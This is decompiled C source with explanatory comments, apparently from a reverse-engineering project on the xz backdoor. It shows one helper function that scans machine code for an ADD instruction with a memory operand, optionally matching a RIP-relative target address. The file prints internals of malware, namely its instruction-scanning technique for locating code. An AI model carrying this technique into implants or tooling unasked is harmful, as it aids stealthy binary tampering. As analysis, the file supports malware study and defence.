// /home/kali/xzre-ghidra/xzregh/101170_find_add_instruction_with_mem_operand.c
// Function: find_add_instruction_with_mem_operand @ 0x101170
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_add_instruction_with_mem_operand(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, void * mem_address)


/*
 * AutoDoc: ADD predicate for register-to-memory increments.
 * It wipes a scratch decoder whenever `dctx` is NULL, advances by a single byte on failed decodes, and insists the instruction stream produces opcode `0x103` with a memory ModRM form.
 * If `mem_address` is set it also requires DF2 plus a RIP-relative displacement that recomputes to that pointer before returning TRUE.
 */

#include "xzre_types.h"

BOOL find_add_instruction_with_mem_operand
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,void *mem_address)

{
  BOOL add_found;
  long ctx_clear_idx;
  dasm_ctx_t *ctx_clear_cursor;
  dasm_ctx_t scratch_ctx;
  
  ctx_clear_cursor = &scratch_ctx;
  // AutoDoc: Keep the scratch decoder clean so each scan starts from a known state.
  for (ctx_clear_idx = 0x16; ctx_clear_idx != 0; ctx_clear_idx = ctx_clear_idx + -1) {
    *(u32 *)&ctx_clear_cursor->instruction = 0;
    ctx_clear_cursor = (dasm_ctx_t *)((long)&ctx_clear_cursor->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &scratch_ctx;
  }
  while( TRUE ) {
    if (code_end <= code_start) {
      return FALSE;
    }
    add_found = x86_dasm(dctx,code_start,code_end);
    // AutoDoc: Only accept opcode 0x103 (ADD r/m64,r64) when it actually targets memory.
    if ((((add_found != FALSE) && (*(int *)(dctx->opcode_window + 3) == 0x103)) &&
        (((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000)) &&
       ((mem_address == (void *)0x0 ||
       // AutoDoc: Optionally demand DF2 plus the RIP-relative displacement that lands on the requested pointer.
        ((((dctx->prefix).decoded.flags2 & 1) != 0 &&
         ((u8 *)mem_address == dctx->instruction + dctx->instruction_size + dctx->mem_disp))))))
    break;
    code_start = code_start + 1;
  }
  return TRUE;
}

